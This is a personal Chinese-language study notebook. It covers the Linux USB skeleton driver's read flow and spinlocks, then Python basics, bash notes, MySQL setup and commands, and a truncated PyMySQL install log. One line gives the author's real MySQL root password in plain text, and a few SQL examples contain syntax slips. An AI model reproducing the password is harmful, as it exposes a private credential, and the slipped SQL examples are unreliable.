   当usb连接后，只有当host端发送读数据请求到 usb从设备时，usb从设备才会把数据发向host端
   否则即使，usb从设备 已经主动把数据放到 in-ep 端点队列，usb总线也不会执行数据传输！！
   当 usb连接好，skel0设备节点也就设立了，cat /dev/skel0 也就执行读 skel0设备了的操作了
   注意 cat 打开了skel0后，不是只读一次设备然后显示，而是循环不断，读一次显示一次！！！
   假设当usb从设备 已经主动把数据放到 in-ep 端点队列，cat打开了skel0，开始读设备，开始执行skel_read，
   然而此刻usb线还未开始传输数据，以下分析skel_read：
	检查，设备skel0有没有拥有读入数据的功能，有则继续
		即检查host端驱动初始化时有没有预设了一个 申请从usb从设备获得数据的urb，dev->bulk_in_urb
		这个urb跟host端驱动生命周期相同，即同时存活，这个urb在probe分配得到，
		在disconnect调用的kref_put的skel_delete里释放！！！		
	检查，有没有其他操作占用设备skel0，没有则继续
	设置循环点retry
	检查，IO传输是不是正在执行（即usb总线是不是正在执行数据传输），还没有开始执行，于是继续
	检测 /dev/skel0是否有错误在身，不是则继续
	检查 skel0 有没有收到数据， usb总线还未曾执行数据传输，所以没有，于是继续
	执行 skel_do_read_io 即提交 获得usb从设备到host端数据 的urb，如果没有出错（这时usb总线才开始执行数据传输）
	然后跳回循环点retry执行
	检查，IO传输是不是正在执行（即usb总线是不是正在执行数据传输），这时正在执行
		检查skel0是不是阻塞设备，如果是，就结束skel_read,不再困在这个函数里，就是一时间读不到数据，但结束不在读。
		如果不是阻塞设备，就开始wait_event_interruptible 开始睡眠进程，直到时间到，或者被中断
	睡眠后，
	检测 是否有错误在身，不是则继续
	检查 skel0 有没有收到数据， 假如已经有！！
	检查available，由于是第一次循环读数据，而不是多次后，所以没有到数据末尾，所以是available。
	于是把dev->bulk_in_buffer + dev->bulk_in_copied地址的内容拷到 user 的 buffer
	最后，如果这时，我想读出count数据量，大于，我们实际收到的，我们会 再次skel_do_read_io，
	但不打算等待下次 usb从设备发来的数据，带着我们已经读到的数据，直接离开函数，
   skel_read()读函数比较麻烦，但是还是遵从一个规则，就是，他提交了读取数据的urb后，usb总线才开始传输数据！！！
   skel_read_bulk_callback：
	当 usb_core 执行好读取数据的urb后，即执行了 skel_do_read_io 提交的urb后
	数据已经从usb从设备处传到host端后，触发中断执行
	并没有特别操作 
5，其他操作函数：
	skel_open：打开设备节点
	skel_release：关闭设备节点，注意这执行了kref_put(&dev->kref, skel_delete)，但是kref并没有到0，所以不执行skel_delete
	skel_flush： flush一般是把内存的内容刷入硬盘的操作，而这里函数里只是完成并停止 usb总线的传输
		    （通知usb_core,通过删除未处理urb，或完成正在处理的urb），并不知道是为什么情况存在，
6，skelton驱动函数集，（与/dev设备点的函数集是不一样的）
	skel_probe： 如上述，
	skel_disconnect： 当人为或意外断开了usb总线连接，就会触发的卸载 skel0设备的函数
	skel_suspend： 完成并尽快停止 usb总线的传输，（通知usb_core,通过删除未处理urb，或完成正在处理的urb）
	skel_resume： 并无操作， 因为暂停skel只是处理urb，并不是从硬件或时钟处暂停usb，所以resume并不会有什么操作
	skel_pre_reset： 相当于skel_suspend pre_reset表示设备复位前做的工作
	skel_post_reset：重置error发flag post_reset表示设备复位后做的工作

（补充）linux 的常见api学习：
spin_lock的调用关系
	spin_lock
		-> raw_spin_lock
			-> _raw_spin_lock
				-> __raw_spin_lock
					->>preempt_disable();  
  					-spin_acquire(&lock->dep_map, 0, 0, _RET_IP_);  
					->LOCK_CONTENDED(lock, do_raw_spin_trylock, do_raw_spin_lock);
spin_lock_irq的调用关系
	spin_lock_irq
		-> raw_spin_lock_irq
			-> _raw_spin_lock_irq
				-> __raw_spin_lock_irq
					->local_irq_disable();  
					->preempt_disable();  
					->spin_acquire(&lock->dep_map, 0, 0, _RET_IP_);  
					->LOCK_CONTENDED(lock, do_raw_spin_trylock, do_raw_spin_lock);
spin_lock 是上spin锁，而spin_lock_irq是上spin锁前先禁止linux中断
usb_alloc_coherent：分配dma 缓存空间给urb存放要传输的内容
usb_anchor_urb：关联 anchor锚点 和 urb ，方便跟踪urb 不知如何去跟踪使用！
wait_event_interruptible（）：暂时睡眠进程，然后得到中断后再重新执行进程
usb_alloc_urb 和 usb_free_urb 是对立，一个是分配一个空间给urb，一个是释放占用的空间
kerf模块：
	kerf是镶嵌在模块里记录模块生命周期的计数器，
	probe 模块时，一般初始化一个kref计数器：kref_init设1，或 kref_set设一个自定义值
	在模块操作时会使用 kref_get kref_put 来记录生命周期变化情况
	例如，open一个设备，kref_get 加1，release一个设备，kref_put 减1，
	当模块出错，或者退出模块，或者意外断开，执行处理函数也要执行kref_put,继续减1，此刻计数器一般回到0，
	当计数器回到0时，就执行kref_put绑定的 自定义的处理函数来释放空间，删除初始化，删除模块
	










20170414
显然 usb_skelton是主机端usb系统 里的一个上层驱动，提供与再上一层的用户程序的接口，也通过usb系统提供的接口与usb主机控制器交互！！
主机端的usb驱动实际的构成如下
	上层驱动（具体功能驱动） --> usb_core服务架构 -->底层驱动（usb主机控制器驱动）
	上层驱动：如我们研究的 usb_skelton，是关于访问一个 usb从设备的驱动，通过usb_core服务架构最终控制主机控制器的数据传输达到访问目的
	usb_core服务架构: 源码/drivers/usb/core/×
	底层驱动： 例如ehci（usb2.0）的控制器驱动：ehci_atmel_hc_driver.c ehci_hcd.c
hcd（host control driver）：
	usb_core服务里关于主机控制器的操作是 hcd.c
	而ehci_atmel_hc_driver.c 是一个具体的底层hcd驱动，只提取特征初始化了一个通用的hcd控制器，指定了硬件寄存器指定访问地址
	而ehci_hcd.c 提供通用的hcd控制器，访问硬件寄存器，从而实现对主机控制器的访问
关于usb的大概框架已经了解，而详细细节需要看书补充

usb-core服务框架：
/drivers/usb/core/usb.c是服务框架初始化的开始
/drivers/usb/core/driver.c用作匹配 usb设备，和设备驱动的，匹配成功就会probe初始化设备驱动 
USB四大描述符：设备描述符，配置描述符，接口描述符，端点描述符
usb协议上说的接口interface 即是代表一个功能，例如一个usb从设备，扬声器是一个功能，u盘是一个功能，摄像头是一个功能
	而这些功能在linux系统上看来，这个扬声器属于声音这类主设备，的一个次设备，其他同理推
usb协议上说的配置configure 即是代表被激活可使用的一组功能，例如一个usb从设备，扬声器和u盘同时使用属于一个配置，
	摄像头与键盘与扬声器能同时使用是另一个配置















20170417
python 学习！！ 详见kingders/home/python_study
进入python命令行界面 $ python3.4

脚本编写：
#! /usr/bin/python3.4	//开头一定要表明翻译器
# -*- coding:UTF-8 -*-	//指定了使用 UTF-8 编码
在脚本里 if语法的执行句可以使用tab间隔，也可以多个空格间隔，在命令行界面上，只能用空格

开启翻译器时，先执行预执行脚本
命令行模式下得知放置预执行脚本位置：
	>>> import site
	>>> site. getusersitepackages ()
	'/home/kingders/.local/lib/python3.4/site-packages'
然后在/home/kingders/.local/lib/python3.4/site-packages目录下创建名为usercustomize.py 的文件
把预执行的内容加入到这个脚本文件里即可
下次开启翻译器时，先执行预执行脚本

python数值 与 数学运算 注意点：
>>> # 整 数 相 除 返 回 地 板 数 :此外“#”是注释符
... 7//3
2
>>> 7//-3
-3
>>> 8/5 # 整 数 相 除 时 并 不 会 丢 失 小 数 部 分 此外“#注释段”可与代码段同行
1.6
等号 ( '=' ) 用于把一个值分配给一个变量
>>> width = 20
>>> height = 5*9
>>> width * height
900
变量在使用之前必须要被“定义”(分配一个值), 否则会产生一个错误
>>>  n
Traceback (most recent call last):
File "<stdin >", line 1, in < module >
NameError : name 'n' is not defined
支持复数，虚数部分使用符号j
>>> a=1.5+0.5j
>>> a.real
1.5
>>> a.imag
0.5
>>> abs(a)  # 求出虚数的模
1.5811388300841898

python 字符 字符串注意点：

单双引号标出字符串变量
>>> 'kj\"'  
'kj"'
>>> "kj\""
'kj"'

字符串变量赋值还有 \ 的应用，换行时代表逻辑延续，不换行时代表表示特殊符号
>>> hello = "我爱你\n\
... kjkjikjii你\
... 你好吗"
>>> print(hello)
我爱你
kjkjikjii你你好吗

三对双引号，可以简单初始化一个充满各种特殊符号的字符串
>>> hello = """ haha\
... 你是谁
... 我不知道      {真的}
... """
>>> print(hello)
 haha你是谁
我不知道      {真的}

字符串的加乘操作，没有减除法
>>> a ="iam"
>>> b ='kkk'
>>> c = a + b
>>> print(c)
iamkkk
>>> d = 4*a + b
>>> print(d)
iamiamiamiamkkk

字符自动粘连
>>> 'str ' 'ing '
'string '
>>> 'str '.strip() + 'ing '
'string '

字符串切片
>>> w = "abcdef"
>>> w[-6]
'a'
>>> w[2]
'c'
>>> w[0:2]
'ab'
>>> w[1:2]
'b'
>>> w[1:3]
'bc'
>>> w[0:]
'abcdef'
>>> w[1:]
'bcdef'
>>> w[2:2]
''
>>> w[-1:]
'f'
>>> w[-6:]
'abcdef'
>>> w[-6:3]
'abc'
>>> w[-6:-4]
'ab'
>>> 
理解图
+---+---+---+---+---+---+
| a | b | c | d | e | f |
+---+---+---+---+---+---+
0   1   2   3   4   5   6
-6  -5  -4  -3  -2  -1

字符串长度
>>> s = 'supercalifragilisticexpialidocious '
>>> len(s)
34

字符串数组，及其切片，长度
>>> a = ['spam ', 'eggs ', 100 , 1234]
>>> a
['spam ', 'eggs ', 100 , 1234]
>>> a[0]
'spam '
>>> a[3]
1234
>>> a[-2]
100
>>> a[1:-1]
['eggs ', 100]
>>> a[:2] + ['bacon ', 2*2]
['spam ', 'eggs ', 'bacon ', 4]
>>> 3*a[:3] + ['Boo!']
['spam ', 'eggs ', 100 , 'spam ', 'eggs ', 100 , 'spam ', 'eggs ',
100 , 'Boo!']
>>> a[:]	#浅复制
['spam ', 'eggs ', 100 , 1234]
>>> a
['spam ', 'eggs ', 100 , 1234]
>>> a[2] = a[2] + 23
>>> a
['spam ', 'eggs ', 123 , 1234]
>>> # 替 代 一 些 项 :
... a[0:2] = [1, 12]
>>> a
[1, 12 , 123 , 1234]
>>> # 移 除 一 些 :
... a[0:2] = []
>>> a
[123 , 1234]
>>> # 插 入 一 些 :
... a[1:1] = ['bletch ', 'xyzzy ']
>>> a
[123 , 'bletch ', 'xyzzy ', 1234]
>>> # 在 开 始 处 插 入 自 身 ( 的 一 个 拷 贝 )
>>> a[:0] = a
>>> a
[123 , 'bletch ', 'xyzzy ', 1234 , 123 , 'bletch ', 'xyzzy ', 1234]
>>> # 清 除 列 表 : 用 空 列 表 替 代 所 有 的 项
>>> a[:] = []
>>> a
[]
>>> a = ['a', 'b', 'c', 'd']
>>> len(a)
4

嵌套列表
>>> q = [2, 3]
>>> p = [1, q, 4]
>>> len(p)
3
>>> p[1]
[2,3]
>>> p[1][0]
2
>>> p[1]. append ('xtra ')
>>> p
[1, [2, 3, 'xtra '], 4]
>>> q
[2, 3, 'xtra ']

多重赋值 (注意第二段赋值，先算a=b，但b=a+b时的a依然是1)
>>> a, b = 1, 2
>>> a, b = b, a+b
>>> a
2
>>> b
3

特别注意python的数据结构 元祖 列表 集合与字典的区别
元祖一般与()有关
列表一般与[]有关
字典一般与:有关
集合一般与{}有关
关于这些数据结构的内容日后再讨论

现在讨论函数包与函数模块的内容
导入模块/包：
inport ddd
from xxx import ×	//与 xxx 包里的__init__.py的 __all__ 参数一并使用，把__all__的指向的模块/子包全导入

文件操作集
>>> f = open('/home/kingders/python_study/test','r')	//打开文件，赋予读权限
>>> f.read()			//读出所有内容
'i am boy\nyou are girl\nlet marry \n'
>>> f.read()			//接着上次内容指针继续读，然而已经到文件结尾，并没有什么可以读出
''
>>> f = open('/home/kingders/python_study/test','r')	//重新打开文件，赋予读权限，所有状态复位
>>> f.readline()	//读出第一行内容
'i am boy\n'
>>> f.readline()	//读出第二行内容
'you are girl\n'
>>> f.readline()	//读出第三行内容
'let marry \n'
>>> f.readline()	//读出第四行内容，然而并没有内容了
''
>>> f = open('/home/kingders/python_study/test','r')	//重新打开文件，赋予读权限，所有状态复位
>>> f.readlines()	//分别读出所有行的内容并打印
['i am boy\n', 'you are girl\n', 'let marry \n']
>>> f.close()		//关闭文件
此外不不细说的内容有：
	open r读权限 w写权限 r+读写权限 a末尾追加写权限 b以binary mode 打开文件，可组合rb，wb，ab，rb+ 默认不填权限为读权限
	f.write()		//写文件
	f.seek()		//文件寻位置
	还有pickle模块：方便把python各种数据结构变量 与 字符串 的相互转换，方便把数据写到文件里，和从文件里取出数据来处理

异常发生剂处理，一般使用 try和expect组合
>>> while True:
...    try:
...        x = int(input (" Please ␣ enter ␣a␣ number :␣"))
...        break
...    except ValueError :
...        print ("Oops!  That was no valid number.  Try again ...")
先执行try段，正常运行时，不跑except段，当出现异常时，判断是不是except段指明的异常再执行expect段
还有一个 try，expect，final组合，不管是否有异常，try段后都会执行final段的内容

域和命名空间例子
>>>def scope_test ():
...    def do_local ():
...        spam = " local ␣spam"
...    def do_nonlocal ():
...        nonlocal spam
...        spam = " nonlocal ␣spam"
...    def do_global ():
...        global spam
...        spam = " global ␣spam"
...
...    spam = "test␣spam"
...    do_local ()
...    print(" After ␣ local ␣ assignment :", spam)
...    do_nonlocal ()
...    print(" After ␣ nonlocal ␣ assignment :", spam)
...    do_global ()
...    print(" After ␣ global ␣ assignment :", spam)
...
>>>scope_test ()
>>>print("In␣ global ␣ scope :", spam)
After local assignment: test spam
After nonlocal assignment: nonlocal spam
After global assignment: nonlocal spam
In global scope: global spam
这里同名spam应该有4个，但是分贝属于不同空间，而且优先权也不一样
def 是定义内容的句柄，这里就定义了4个函数，而且出现的镶嵌定义的情况

类
>>> class Complex :
...    def __init__ (self , realpart , imagpart ):
...    self.r = realpart
...    self.i = imagpart
...
>>> x = Complex (3.0, -4.5)
>>> x.r, x.i
(3.0, -4.5)
这是一个典型的类例子！！！上述关于类的初始化，特别注意，self指一个类变量他自己本身

关于python编程已经入门书了一遍，更多细节通过实践细节掌握！！

附加1：快速寻找文件路径命令which，例如： which python3.4
附加2：python的函数api
input（“please enter ”）	//输入内容函数，双括号只是显示出来的作为提示字符串，双括号的内容不计入为输入的内容
				//输入的内容纯记做为字符串
int（f）	//把检查f变量，如果是纯数字字符串，就转变为对应的数字变量，
		//如果是数字变量，变成是正整数数字变量

附加3：关于计算机的小数，浮点问题
计算机里小数是浮点数据表示，但是根据 IEEE-754估计标准和硬件结构，浮点是以二进制形式表示的，而精度只有53位（二进制的精度）
这么说 0.1 在计算机里的存在就不是完全的0.1，只能是近似的0.1！！
0.1 = 1/10 ～= J / 2^N
最近似的结果就是 7205759403792794 / 2^56
j为7205759403792794，N为56
做一个实验：
>>> a = 0.1+0.1+0.1
>>> a
0.30000000000000004
由于0.1在计算机上不能是完全的 0.1，只是近似值，所以3个连加也得不到真正的0.3！只能是有偏差的0.3！！！











20170418
bash学习：

引号内内容不被解释器解释

注意使用正则表达式

注意数组和数组字符串的操作

case用法，类似c语言的switch
case `basename $0` in
"name1" ) do_something;;
"name2" ) do_something_else;;
"name3" ) do_yet_another_thing;;
*	) bail_out;;
esac

函数 函数的参数 声明 和 include 有待深究
function function_name {
command...
}
或
function_name () {
command...
}
参数直接在函数里使用以$1,$2,$3代表，并不需要在函数名开头就声明



附加1：
shell控制符
Ctl-B	光标后退,这应该依赖于 bash 输入的风格,默认是 emacs 风格的.
Ctl-C	Break,终止前台工作.
Ctl-D	从当前 shell 登出(和 exit 很像)
	"EOF"(文件结束符).这也能从 stdin 中终止输入.
	在 console 或者在 xterm window 中输入的时候,Ctl-D 将删除光标下字符.
	当没有字符时,Ctrl-D 将退出当前会话.在 xterm window 也有关闭窗口的效果.
Ctl-G	beep.在一些老的终端,将响铃.
Ctl-H	backspace,删除光标前边的字符.
Ctl-I	就是 tab 键.
Ctl-J	新行.
Ctl-K	垂直 tab.(垂直 tab?新颖,没听过)
	作用就是删除光标到行尾的字符
Ctl-L	clear,清屏.
Ctl-M	回车
Ctl-Q	继续(等价于 XON 字符),这个继续的标准输入在一个终端里
Ctl-S	挂起(等价于 XOFF 字符),这个被挂起的 stdin 在一个终端里,用 Ctl-Q 恢复
Ctl-U	删除光标到行首的所有字符,在某些设置下,删除全行.
Ctl-V	当输入字符时,Ctl-V 允许插入控制字符.比如,下边 2 个例子是等价的
	echo -e '\x0a'
	echo <Ctl-V><Ctl-J>
Ctl-V 在文本编辑器中十分有用,在 vim 中一样.
Ctl-W	删除当前光标到前边的最近一个空格之间的字符.
	在某些设置下,删除到第一个非字母或数字的字符.
Ctl-Z	终止前台工作.
附加2：
转义字符
\n	意味着新的一行
\r	回车
\t	tab 键
\v	vertical tab(垂直 tab),查前边的 Ctl-K
\b	backspace,查前边的 Ctl-H
\a	"alert"(如 beep 或 flash)
\0xx 转换成 8 进制 ASCII 解码,等价于 oxx










20170423
学习 mysql 数据库：
ubuntu 部署 mysql：（以下自家pc部署实践，不是公司机子部署）
sudo apt-get install mysql-server 
	//安装 mysql 服务器程序 会提示设置root 用户的 密码，我设为362951847
	//可能提示404  Not Found 错误，更新软件库：sudo apt-get update
	//过程中其实安装了以下包了：
		mysql-common all 5.5.54-0ubuntu0.14.04.1 [13.0 kB]
		mysql-client-core-5.5 amd64 5.5.54-0ubuntu0.14.04.1 [709 kB]
		mysql-client-5.5 amd64 5.5.54-0ubuntu0.14.04.1 [1,603 kB]
		mysql-server-core-5.5 amd64 5.5.54-0ubuntu0.14.04.1 [3,763 kB]
		mysql-server-5.5 amd64 5.5.54-0ubuntu0.14.04.1 [1,849 kB]
		mysql-server all 5.5.54-0ubuntu0.14.04.1 [11.3 kB]
	//新版此命令也安装了 mysql-client，
	//所以不用再 sudo apt-get isntall mysql-client，否则出错：E: Invalid operation isntall
sudo apt-get install libmysqlclient-dev 
	//安装 第三方软件 调用 mysql客户端 的接口库，有以下包：
		libmysqlclient18 amd64 5.5.54-0ubuntu0.14.04.1 [597 kB]
		libmysqlclient-dev amd64 5.5.54-0ubuntu0.14.04.1 [869 kB]
sudo netstat -tap | grep mysql
	//安装完后，此命令检查 server是否安装成功并开启：（出现listen，表示成功并开启，安装成功后默认开启）
tcp        0      0 localhost:mysql         *:*                     LISTEN      10611/mysqld 
sudo service mysql stop		//关闭mysql服务：一定要加sudo，否则出错：stop: Unknown job: mysql
sudo service mysql start	//打开mysql服务：一定要加sudo，否则出错：start: Unknown job: mysql
sudo service mysql restart	//重启mysql服务：一定要加sudo，否则出错
mysql -u root -p 	
	//还有一个参数是 -h xxx 表示数据库服务器所在主机名，这里由于与客户端登陆程序同在一个机子，即访问本地机子的数据库，可忽略	
	//登陆mysql数据库，-u 表示数据库开放给的用户对象的用户名， -p 表示登陆的用户密码，上面命令输入之后会提示输入密码
	//注意，登陆命令是打开了client端，通过客户端与后台运行的服务端交互
	//而操作人员直接与客户端的命令行界面交互	
登陆mysql数据库，进入命令行交互后：	
mysql>		//是这样的，每条命令结尾都要加；号，才表示执行一条完整命令
至此，基础部署完成，
执行 show databases; 查看当前构建了的数据库

mysql客户端快捷键：
Up 箭头,Ctrl-p 		调前面的行
Down 箭头,Ctrl-N 	调下一行
Left 箭头,Ctrl-B 	光标左移(向后)
Right 箭头,Ctrl-F	光标右移(向前)
Escape Ctrl-B 		向后移一个词
Escape Ctrl-F 		向前移一个词
Ctrl-A 			将光标移到行头
Ctrl-E 			将光标移到行尾
Ctrl-D 			删除光标下的字符
Delete 			删除光标左边的字符
Escape D 		删词
Escape Backspace 	删除光标左边的词
Ctrl-K 			删除光标到行尾的所有字符
Ctrl-_ 			撤消最后的更改;可以重复

mysql客户端批处理：
导入命令脚本实行批处理，
mysql -u root -p < file1	//执行 file1 批处理命令文件
导入命令脚本实行批处理，并把处理log输出到一个文本里记录下来
mysql -u root -p < file1 > file2	//把操作log输出到file2文件里记录下来

mysql客户端重要命令集：
show databases like ‘my%’;	//列出名称包含关字 my 的数据库
show databases;			//显示服务器里已经存在的数据库
create database xxx;		//创建数据库 xxx
drop database xxx;		//删除数据库
CREATE TABLE xxx.xxx1(id int, name TEXT);	//给xxx 创建一个表单xxx1
use xxx；			//转到 xxx 数据库
CREATE TABLE xxx2(sex TEXT, age int);		//同样给 xxx 创建一个表单xxx2 由于之前使用了use xxx；命令，所以不用指定数据库
insert into xxx1 values(1,"janice_vidal");	//给表 插入一条 完整数据内容，由于之前使用了use xxx；而不用指定数据库
insert into xxx.xxx1 values(2,"wingkidng_wong"),(3,"heddi_lee");//插入多条完整数据内容的做法，假如之前没有使用use xxx；要指定数据库
insert into xxx.xxx1(name) values("gem0816"),("dilirba");	//插入部分数据内容，列表中未给出名称的列都将赋予缺省值
select* from xxx.xxx1;		//查看xxx1数据表内容，显示内容例子如下：
				//+------+----------------+
				//| id   | name           |
				//+------+----------------+
				//|    1 | janice_vidal   |
				//|    2 | wingkidng_wong |
				//|    3 | heddi_lee      |
				//| NULL | gem0816        |
				//| NULL | dilirba        |
				//+------+----------------+
				//5 rows in set (0.00 sec)
select* from xxx.xxx1 where name="janice_vidal";	//查看特定行，显示内容例子如下：
							//+------+--------------+
							//| id   | name         |
							//+------+--------------+
							//|    1 | janice_vidal |
							//+------+--------------+
							//1 row in set (0.00 sec)
select name from xxx.xxx1;	//查看特定列，显示例子如下 
				//+----------------+
				//| name           |
				//+----------------+
				//| janice_vidal   |
				//| wingkidng_wong |
				//| heddi_lee      |
				//| gem0816        |
				//| dilirba        |
				//+----------------+
				//5 rows in set (0.00 sec)
				//（注意同时查看多列的格式示范，假如我们也建立了这些列，譬如：select name，birth，sex from xxx.xxx1;)	
select name from xxx.xxx1 where id=1;		//查看有筛选条件的特定列内容 显示例子如下
						//+--------------+
						//| name         |
						//+--------------+
						//| janice_vidal |
						//+--------------+
						//1 row in set (0.00 sec)
delete from xxx.xxx1				//删除xxx1表里的全部数据内容
delete from xxx.xxx1 from name=“gem0816”	//删除xxx1表里的某条（即某列）数据内容
alter table xxx1 add column money int;		//给数据表添加一列属性 columns（列项） money是这属性的名字，int是数据格式
						//mysql> select* from xxx1;
						//+----------------+------+-------+
						//| name           | id   | money |
						//+----------------+------+-------+
						//| janice_vidal   |    1 |  NULL |
						//| wingkidng_wong |    2 |  NULL |
						//| heddi_lee      |    3 |  NULL |
						//| gem0816        | NULL |  NULL |
						//| dilirba        | NULL |  NULL |
						//| a              |   41 |  NULL |
						//| b              |   20 |  NULL |
						//| c              |    6 |  NULL |
						//+----------------+------+-------+
						//8 rows in set (0.00 sec)
						//alter table xxx1 drop money;  删除一列属性及储存的数据内容
update xxx1 set id=39,money=1000 where name="wingkidng_wong";	//修改 数据表的 其中一条数据内容
								//mysql> select* from xxx1;
								//+----------------+------+-------+
								//| name           | id   | money |
								//+----------------+------+-------+
								//| janice_vidal   |    1 |  NULL |
								//| wingkidng_wong |   39 |  1000 |
								//| heddi_lee      |    3 |  NULL |
								//| gem0816        | NULL |  NULL |
								//| dilirba        | NULL |  NULL |
								//| a              |   41 |  NULL |
								//| b              |   20 |  NULL |
								//| c              |    6 |  NULL |
								//+----------------+------+-------+
								//8 rows in set (0.00 sec)
关于索引的功能探索，以及与数据表的关系：
alter table xxx.xxx1 add index(id)；	//添加一条索引信息（key）到 默认索引文件里
show keys from xxx1;			//显示添加的索引信息（key）
show index from xxx1;			//显示默认索引文件内容，
alter table xxx1 drop index id;		//删除添加了的 索引信息（key）：id
关于索引与数据表数据检索的操作与关系，理解后详细补充

以下是未细致认证的典型命令实例
mysql> CREATE TABLE pet1
    -> SELECT name AS animal,owner AS child
    -> FROM pet;	//把pet数据表的 name 和 owner 两列数据内容，拷到新建的数据表 pet1 的animal 和 child 列去

终端命令集：
mysql -u root -p 		//客户端登陆到服务器，并转到mysql客户端命令行终端 ，要按提示输入访问用户root的密码
mysqlshow -u root -p xxx	//显示本地数据库服务器上的 xxx 数据库，要按提示输入访问用户root的密码

mysql数据库知识
数据库里的每个数据表都是由三个文件组成一个格式(描述)文件.frm、一个数据文件.ISD/.MYD 和 一个索引文件.ISD/.MYI










20170424
python3.4 访问 mysql
安装链接库包;
1，mysql官网的 mysql-connector
先到mysql官网下载 python插件包：mysql-connector-python-cext-py3_2.1.6-1ubuntu14.04_amd64.deb
https://dev.mysql.com/downloads/connector/python/
针对ubuntu14.04 x64 使用deb软件包
成功安装针对python3的包，使用失败，在python3.4的命令行交互端里输入：import mysql.connector，出错：
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ImportError: No module named 'mysql'
成功安装针对python2的包，使用失败，在python2.7的命令行交互端里输入：import mysql.connector，出错：
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ImportError: No module named mysql.connector
2，MySQLdb
网上也说 这个第三方包不支持python3
3，PyMySQL ptyhon官方推荐的python3 的mysql接口
下载源码： https://github.com/PyMySQL/PyMySQL
解压安装，安装时一定要转到root用户安装
root@kingders-ThinkPad-T420:/home/kingders/smart210/study/python_study/thirdpart_pack/PyMySQL/PyMySQL-master# python3 setup.py install
running install
Checking .pth file support in /usr/local/lib/python3.4/dist-packages/
/usr/bin/python3 -E -c pass
TEST PASSED: /usr/local/lib/python3.4/dist-packages/ appears to support .pth files
running bdist_egg
running egg_info
creating PyMySQL.egg-info
writing PyMySQL.egg-info/PKG-INFO
writing dependency_links to PyMySQL.egg-info/dependency_links.txt
writing top-level names to PyMySQL.egg-info/top_level.txt
writing manifest file 'PyMySQL.egg-info/SOURCES.txt'
reading manifest file 'PyMySQL.egg-info/SOURCES.txt'
reading manifest template 'MANIFEST.in'
writing manifest file 'PyMySQL.egg-info/SOURCES.txt'
installing library code to build/bdist.linux-x86_64/egg
running install_lib
running build_py
creating build
creating build/lib
creating build/lib/pymysql
copying pymysql/cursors.py -> build/lib/pymysql
copying pymysql/charset.py -> build/lib/pymysql
copying pymysql/connections.py -> build/lib/pymysql
copying pymysql/optionfile.py -> build/lib/pymysql
copying pymysql/times.py -> build/lib/pymysql
copying pymysql/err.py -> build/lib/pymysql
copying pymysql/__init__.py -> build/lib/pymysql
copying pymysql/_socketio.py -> build/lib/pymysql
copying pymysql/_compat.py -> build/lib/pymysql
copying pymysql/converters.py -> build/lib/pymysql
copying pymysql/util.py -> build/lib/pymysql
creating build/lib/pymysql/tests
copying pymysql/tests/test_issues.py -> build/lib/pymysql/tests
copying pymysql/tests/test_connection.py -> build/lib/pymysql/tests
copying pymysql/tests/test_DictCursor.py -> build/lib/pymysql/tests
copying pymysql/tests/test_optionfile.py -> build/lib/pymysql/tests
copying pymysql/tests/test_nextset.py -> build/lib/pymysql/tests
copying pymysql/tests/test_load_local.py -> build/lib/pymysql/tests
copying pymysql/tests/test_err.py -> build/lib/pymysql/tests
copying pymysql/tests/test_converters.py -> build/lib/pymysql/tests
copying pymysql/tests/test_SSCursor.py -> build/lib/pymysql/tests
copying pymysql/tests/base.py -> build/lib/pymysql/tests
copying pymysql/tests/__init__.py -> build/lib/pymysql/tests
copying pymysql/tests/test_cursor.py -> build/lib/pymysql/tests
copying pymysql/tests/test_basic.py -> build/lib/pymysql/tests
creating build/lib/pymysql/constants
copying pymysql/constants/SERVER_STATUS.py -> build/lib/pymysql/constants
copying pymysql/constants/ER.py -> build/lib/pymysql/constants
copying pymysql/constants/CR.py -> build/lib/pymysql/constants
copying pymysql/constants/FIELD_TYPE.py -> build/lib/pymysql/constants
copying pymysql/constants/__init__.py -> build/lib/pymysql/constants
copying pymysql/constants/FLAG.py -> build/lib/pymysql/constants
copying pymysql/constants/COMMAND.py -> build/lib/pymysql/constants
copying pymysql/constants/CLIENT.py -> build/lib/pymysql/constants
creating build/lib/pymysql/tests/thirdparty
copying pymysql/tests/thirdparty/__init__.py -> build/lib/pymysql/tests/thirdparty
creating build/lib/pymysql/tests/thirdparty/test_MySQLdb
copying pymysql/tests/thirdparty/test_MySQLdb/dbapi20.py -> build/lib/pymysql/tests/thirdparty/test_MySQLdb
copying pymysql/tests/thirdparty/test_MySQLdb/test_MySQLdb_nonstandard.py -> build/lib/pymysql/tests/thirdparty/test_MySQLdb
copying pymysql/tests/thirdparty/test_MySQLdb/capabilities.py -> build/lib/pymysql/tests/thirdparty/test_MySQLdb
copying pymysql/tests/thirdparty/test_MySQLdb/__init__.py -> build/lib/pymysql/tests/thirdparty/test_MySQLdb
copying pymysql/tests/thirdparty/test_MySQLdb/test_MySQLdb_dbapi20.py -> build/lib/pymysql/tests/thirdparty/test_MySQLdb
copying pymysql/tests/thirdparty/test_MySQLdb/test_MySQLdb_capabilities.py -> build/lib/pymysql/tests/thirdparty/test_MySQLdb
creating build/bdist.linux-x86_64
creating build/bdist.linux-x86_64/egg
creating build/bdist.linux-x86_64/egg/pymysql
copying build/lib/pymysql/cursors.py -> build/bdist.linux-x86_64/egg/pymysql
copying build/lib/pymysql/charset.py -> build/bdist.linux-x86_64/egg/pymysql
copying build/lib/pymysql/connections.py -> build/bdist.linux-x86_64/egg/pymysql
copying build/lib/pymysql/optionfile.py -> build/bdist.linux-x86_64/egg/pymysql
creating build/bdist.linux-x86_64/egg/pymysql/tests
copying build/lib/pymysql/tests/test_issues.py -> build/bdist.linux-x86_64/egg/pymysql/tests
copying build/lib/pymysql/tests/test_connection.py -> build/bdist.linux-x86_64/egg/pymysql/tests
copying build/lib/pymysql/tests/test_DictCursor.py -> build/bdist.linux-x86_64/egg/pymysql/tests
copying build/lib/pymysql/tests/test_optionfile.py -> build/bdist.linux-x86_64/egg/pymysql/tests
copying build/lib/pymysql/tests/test_nextset.py -> build/bdist.linux-x86_64/egg/pymysql/tests
copying build/lib/pymysql/tests/test_load_local.py -> build/bdist.linux-x86_64/egg/pymysql/tests
copying build/lib/pymysql/tests/test_err.py -> build/bdist.linux-x86_64/egg/pymysql/tests
copying build/lib/pymysql/tests/test_converters.py -> build/bdist.linux-x86_64/egg/pymysql/tests
copying build/lib/pymysql/tests/test_SSCursor.py -> build/bdist.linux-x86_64/egg/pymysql/tests
copying build/lib/pymysql/tests/base.py -> build/bdist.linux-x86_64/egg/pymysql/tests
